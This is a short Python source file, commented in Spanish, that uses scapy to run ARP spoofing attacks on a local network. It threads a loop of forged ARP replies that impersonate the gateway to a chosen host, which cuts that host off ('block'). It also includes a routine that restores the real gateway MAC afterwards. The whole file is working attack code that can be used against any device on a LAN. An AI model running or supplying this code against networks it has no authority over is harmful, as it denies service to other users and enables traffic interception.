
import threading
import time
from scapy.all import ARP, Ether, send, srp, conf

active_attacks = {}

def get_mac(ip):
    """Obtiene la dirección MAC de cualquier IP en la red."""
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except Exception as e:
        print(f"Error en get_mac: {e}")
    return None

def arp_spoof_loop(target_ip, target_mac, gateway_ip, stop_event):
    while not stop_event.is_set():
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet, verbose=False)
        time.sleep(2)

def start_block(target_ip, target_mac):
    gateway_ip = conf.route.route('0.0.0.0')[2]

    if target_mac not in active_attacks:
        stop_event = threading.Event()
        thread = threading.Thread(
            target=arp_spoof_loop, 
            args=(target_ip, target_mac, gateway_ip, stop_event)
        )
        thread.daemon = True
        thread.start()
        active_attacks[target_mac] = stop_event
        return True
    return False

def stop_block(target_ip, target_mac):
    if target_mac in active_attacks:
        active_attacks[target_mac].set()
        del active_attacks[target_mac]
 
        gateway_ip = conf.route.route('0.0.0.0')[2]
        gateway_mac = get_mac(gateway_ip)

        if gateway_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            send(packet, count=5, verbose=False)
        return True
    return False
